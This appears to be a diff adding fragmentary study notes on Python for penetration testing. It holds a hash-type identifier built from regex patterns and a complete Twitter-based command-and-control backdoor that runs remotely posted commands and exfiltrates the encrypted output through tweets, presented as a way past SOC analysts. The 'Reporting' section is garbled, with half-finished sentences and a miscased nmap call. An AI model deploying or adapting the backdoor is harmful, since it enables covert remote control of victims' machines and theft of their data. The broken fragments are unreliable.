+("SMF >= v1.1", r"^[a-fA-F0-9]{40}:[0-9]{8}&"),
+("MySQL 5.x", r"^\*[a-f0-9]{40}$"),
+("MySQL 3.x", r"^[a-fA-F0-9]{16}$"),
+("OSX v10.7", r"^[a-fA-F0-9]{136}$"),
+("OSX v10.8", r"^\$ml\$[a-fA-F0-9$]{199}$"),
+("SAM(LM_Hash:NT_Hash)", r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$"),
+("MSSQL(2000)", r"^0x0100[a-f0-9]{0,8}?[a-f0-9]{80}$"),
+("MSSQL(2005)", r"^0x0100[a-f0-9]{0,8}?[a-f0-9]{40}$"),
+("MSSQL(2012)", r"^0x02[a-f0-9]{0,10}?[a-f0-9]{128}$"),
+("TIGER-160(HMAC)", r"^[a-f0-9]{40}$"),
+("SHA-256", r"^[a-fA-F0-9]{64}$"),
+("SHA-1(Oracle)", r"^[a-fA-F0-9]{48}$"),
+("SHA-224", r"^[a-fA-F0-9]{56}$"),
+("Adler32", r"^[a-f0-9]{8}$"),
+("CRC-16-CCITT", r"^[a-fA-F0-9]{4}$"),
+("NTLM)", r"^[0-9A-Fa-f]{32}$"),
+)
+counter = 0
+for h in hashes:
+    text = hashcheck(h[0], h[1], string_to_check)
+    if text is not None:
+        counter += 1
+        print text
+if counter == 0:
+    print "Your input hash did not match anything, sorry!"
+```
+
+
+# Playloads and shells 
+- need a functioning FTP server. I'm using vsftpd, but you may use whatever you please
+
+- Internet is passable but once a Security Operation Centre (SOC) analyst takes a closer look at all the data that's vanishing up the tubes
+
+```
+from twitter import *
+import os
+from Crypto.Cipher import ARC4
+import subprocess
+import time
+
+token = ''
+token_key = ''
+con_secret = ''
+con_secret_key = ''
+t = Twitter(auth=OAuth(token, token_key, con_secret, con_secret_key))
+
+while 1:
+  user = t.statuses.user_timeline()
+  command = user[0]["text"].encode('utf-8')
+  key = user[1]["text"].encode('hex')
+  enc = ARC4.new(key)
+  response = subprocess.check_output(command.split())
+
+  enres = enc.encrypt(response).encode("base64")
+
+  for i in xrange(0, len(enres), 140):
+          t.statuses.update(status=enres[i:i+140])
+  time.sleep(3600)
+```
+
+
+# Reporting 
+-  Network Time Protocol (NTP) reflection, but on a non-default port? The list can be endless.
+
+- nmap 
+
+nm=nmap.Portscanner()
+
+- beautifulsoup, local Maltego transform, which you can then use within Maltego 
+
+- parsing sslscan into CSV, Sslscan on a specified IP address and output the results into a CSV format
+
+
+plot.ly API to generate our graph
+
+$ pip install plotly
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
